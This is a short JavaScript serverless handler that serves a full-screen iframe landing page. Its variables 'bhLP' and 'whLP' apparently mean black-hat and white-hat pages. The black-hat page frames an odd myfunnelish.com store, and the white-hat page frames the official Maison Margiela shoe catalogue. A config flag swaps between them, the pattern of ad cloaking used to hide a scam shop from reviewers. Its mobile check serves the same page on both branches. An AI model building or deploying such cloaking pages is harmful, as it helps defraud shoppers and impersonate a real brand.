import isRedirectEnabled from './config';

export default function handler(req, res) {

    var bhLP = `
    <html>
        <body>
            <iframe style="display: block; position: absolute; width: 100%; height: 100%;" width="100%" height="100%" frameborder="0" src="https://xjsdiaoqpwepa.myfunnelish.com/imbassd-1736879310456939"></iframe>
        </body>
    </html>
    `;
    
    var whLP = `
    <html>
        <body>
            <iframe style="display: block; position: absolute; width: 100%; height: 100%;" width="100%" height="100%" frameborder="0" src="https://www.maisonmargiela.com/en-us/maison-margiela/men/shoes/"></iframe>
        </body>
    </html>
    `;
    if (isRedirectEnabled) {
        bhLP = whLP;
    }
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

    if (isMobileDevice) {
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(bhLP);
    }
    else { 
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(bhLP);
    }
    
    res.end();
  }
